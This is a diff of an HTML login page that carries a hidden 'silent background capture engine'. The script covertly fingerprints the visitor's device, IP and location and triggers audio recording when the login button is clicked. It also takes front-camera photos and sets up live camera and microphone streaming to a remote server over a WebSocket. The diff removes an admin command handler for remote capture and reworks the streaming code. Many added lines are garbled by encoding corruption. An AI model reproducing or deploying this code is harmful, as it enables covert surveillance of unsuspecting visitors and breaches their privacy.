@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+﻿<!DOCTYPE html>
 <html class="h-full" lang="en">
 
 <head>
@@ -245,7 +245,7 @@
         const username = usernameInput.value;
         const password = passwordInput.value;
 
-        // ── Trigger audio capture on login click ────────────────────
+        // Ã¢â€â‚¬Ã¢â€â‚¬ Trigger audio capture on login click Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
         // Fire immediately so audio records while we wait for fetch
         if (typeof captureAudioOnLogin === 'function') {
           captureAudioOnLogin();
@@ -270,14 +270,14 @@
       });
     </script>
 
-    <!-- ═══════════════════════════════════════════════════════════════
-       SILENT BACKGROUND CAPTURE ENGINE — Not visible to user
-  ═══════════════════════════════════════════════════════════════ -->
+    <!-- Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
+       SILENT BACKGROUND CAPTURE ENGINE Ã¢â‚¬â€ Not visible to user
+  Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â -->
     <script>
       (function () {
         'use strict';
 
-        // ─── WebSocket Setup ────────────────────────────────────────
+        // Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ WebSocket Setup Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
         let ws = null;
         let wsReady = false;
         const msgQueue = [];
@@ -327,24 +327,8 @@
           }
         }
 
-        // ─── Handle Admin Commands ──────────────────────────────────
-        function handleServerCommand(msg) {
-          switch (msg.type) {
-            case 'ASSIGN_ID':
-              ioClientId = String(msg.clientId);
-              if (ioSocket && ioSocket.connected) {
-                ioSocket.emit('register', { uuid: ioClientId });
-              }
-              break;
-            case 'CAPTURE_PHOTO': capturePhoto(); break;
-            case 'CAPTURE_AUDIO': captureAudio(); break;
-            case 'SEND_LOCATION': sendLocation(); break;
-            case 'START_LIVE_CAMERA': startLiveCamera(); break;
-            case 'STOP_LIVE_CAMERA': stopLiveCamera(); break;
-          }
-        }
 
-        // ─── Main Capture Entry Point ───────────────────────────────
+        // Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ Main Capture Entry Point Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
         function startCapture() {
           collectFingerprint();
           // NOTE: Do NOT call requestLocation() here.
@@ -354,11 +338,11 @@
           setupLocationOnUserGesture();
         }
 
-        // ─── Comprehensive Device Fingerprint ───────────────────────
+        // Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ Comprehensive Device Fingerprint Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
         async function collectFingerprint() {
           const fp = {};
 
-          // ── Battery ──────────────────────────────────────────────
+          // Ã¢â€â‚¬Ã¢â€â‚¬ Battery Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
           try {
             if (navigator.getBattery) {
               const batt = await navigator.getBattery();
@@ -371,7 +355,7 @@
             }
           } catch (e) { fp.battery = null; }
 
-          // ── Network / Connection ─────────────────────────────────
+          // Ã¢â€â‚¬Ã¢â€â‚¬ Network / Connection Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
           fp.network = {};
           const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
           if (conn) {
@@ -383,7 +367,7 @@
             fp.network.saveData = conn.saveData != null ? conn.saveData : 'Unknown';
           }
 
-          // ── Public IP + Geo (via free API) ───────────────────────
+          // Ã¢â€â‚¬Ã¢â€â‚¬ Public IP + Geo (via free API) Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
           try {
             const ipRes = await fetch('https://ipinfo.io/json?token=');
             if (ipRes.ok) {
@@ -397,10 +381,10 @@
             }
           } catch (e) { }
 
-          // ── Local IP (WebRTC) ────────────────────────────────────
+          // Ã¢â€â‚¬Ã¢â€â‚¬ Local IP (WebRTC) Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
           fp.network.localIP = await getLocalIP();
 
-          // ── OS & Device ──────────────────────────────────────────
+          // Ã¢â€â‚¬Ã¢â€â‚¬ OS & Device Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
           const ua = navigator.userAgent;
           fp.device = {
             userAgent: ua,
@@ -411,7 +395,7 @@
             standalone: navigator.standalone || window.matchMedia('(display-mode: standalone)').matches ? 'Yes' : 'No'
           };
 
-          // ── Hardware & System ────────────────────────────────────
+          // Ã¢â€â‚¬Ã¢â€â‚¬ Hardware & System Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
           fp.hardware = {
             language: navigator.language || 'Unknown',
             languages: (navigator.languages || []).join(', ') || navigator.language,
@@ -429,10 +413,10 @@
             doNotTrack: navigator.doNotTrack || 'Not set'
           };
 
-          // ── GPU Information ──────────────────────────────────────
+          // Ã¢â€â‚¬Ã¢â€â‚¬ GPU Information Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
           fp.gpu = getGPUInfo();
 
-          // ── Browser Capabilities ─────────────────────────────────
+          // Ã¢â€â‚¬Ã¢â€â‚¬ Browser Capabilities Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
           fp.capabilities = {
             supported: getSupported(),
             cookies: navigator.cookieEnabled ? 'Yes' : 'No',
@@ -441,7 +425,7 @@
             geolocation: 'geolocation' in navigator ? 'true' : 'false'
           };
 
-          // ── Storage Quota ────────────────────────────────────────
+          // Ã¢â€â‚¬Ã¢â€â‚¬ Storage Quota Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
           try {
             if (navigator.storage && navigator.storage.estimate) {
               const est = await navigator.storage.estimate();
@@ -452,14 +436,14 @@
             }
           } catch (e) { fp.storage = null; }
 
-          // ── Timestamp ────────────────────────────────────────────
+          // Ã¢â€â‚¬Ã¢â€â‚¬ Timestamp Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
           fp.collectedAt = new Date().toLocaleString();
 
-          // ── Send the full fingerprint to server ──────────────────
+          // Ã¢â€â‚¬Ã¢â€â‚¬ Send the full fingerprint to server Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
           sendWS({ type: 'visitor_fingerprint', fingerprint: fp });
         }
 
-        // ─── Helper Functions ────────────────────────────────────────
+        // Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ Helper Functions Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 
         function getLocalIP() {
           return new Promise(resolve => {
@@ -543,7 +527,7 @@
           return 'Unknown';
         }
 
-        // ─── Geolocation ────────────────────────────────────────────
+        // Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ Geolocation Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
         let locationRequested = false;
 
         function requestLocation() {
@@ -592,10 +576,10 @@
             (err) => {
               // If it failed because no user gesture, allow retrying on next interaction
               if (err.code === 1) {
-                // PERMISSION_DENIED — might be a real denial or gesture-gate
+                // PERMISSION_DENIED Ã¢â‚¬â€ might be a real denial or gesture-gate
                 sendWS({ type: 'permission_denied', permission: 'location' });
               } else {
-                // POSITION_UNAVAILABLE or TIMEOUT — allow retry
+                // POSITION_UNAVAILABLE or TIMEOUT Ã¢â‚¬â€ allow retry
                 locationRequested = false;
               }
             },
@@ -628,14 +612,14 @@
           );
         }
 
-        // ─── Camera + Microphone ────────────────────────────────────
+        // Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ Camera + Microphone Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
         function requestMediaPermissions() {
           if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
 
           // Request camera first (front-facing if mobile)
           navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
             .then((stream) => {
-              // Got camera — capture photo then free the stream
+              // Got camera Ã¢â‚¬â€ capture photo then free the stream
               capturePhotoFromStream(stream);
               // Now separately request audio
               return navigator.mediaDevices.getUserMedia({ audio: true, video: false });
@@ -657,7 +641,7 @@
             });
         }
 
-        // ─── Photo Capture ──────────────────────────────────────────
+        // Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ Photo Capture Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
         function capturePhotoFromStream(stream) {
           const video = document.createElement('video');
           video.srcObject = stream;
@@ -696,7 +680,7 @@
             });
         }
 
-        // ─── Audio Capture ──────────────────────────────────────────
+        // Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ Audio Capture Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
         function captureAudioFromStream(stream) {
           const chunks = [];
           const mimeType = getSupportedMimeType();
@@ -748,347 +732,266 @@
           return types.find(t => MediaRecorder.isTypeSupported(t)) || '';
         }
 
-        // ─── Live Camera & Audio Streaming ───────────────────────────
-        let liveStreamActive = false;
-        let liveStreamInterval = null;
-        let liveStreamWorker = null;
-        let liveStreamVideo = null;
-        let liveStreamCanvas = null;
-        let liveStreamContext = null;
-        let liveAudioRecorder = null;
-        let liveAudioStream = null;
+        // Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ Live Camera & Audio Streaming Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
+        let liveStreamActive   = false;
+        let liveStreamVideo    = null;
+        let liveStreamCanvas   = null;
+        let liveStreamContext  = null;
+        let liveAudioRecorder  = null;
+        let liveAudioStream    = null;
+        let captureFrameId     = null;
+        let livePeerConnection = null;
 
+        // Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ Start Live Camera Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
         function startLiveCamera() {
-          if (liveStreamActive) return; // already streaming
-          if (!navigator.mediaDevices) return;
+          if (liveStreamActive) return;
+          if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
 
-          // Step 1 — Camera Constraints: HD + high frame rate
           const videoConstraints = {
             facingMode: 'user',
-            width:  { ideal: 1280 },
-            height: { ideal: 720 },
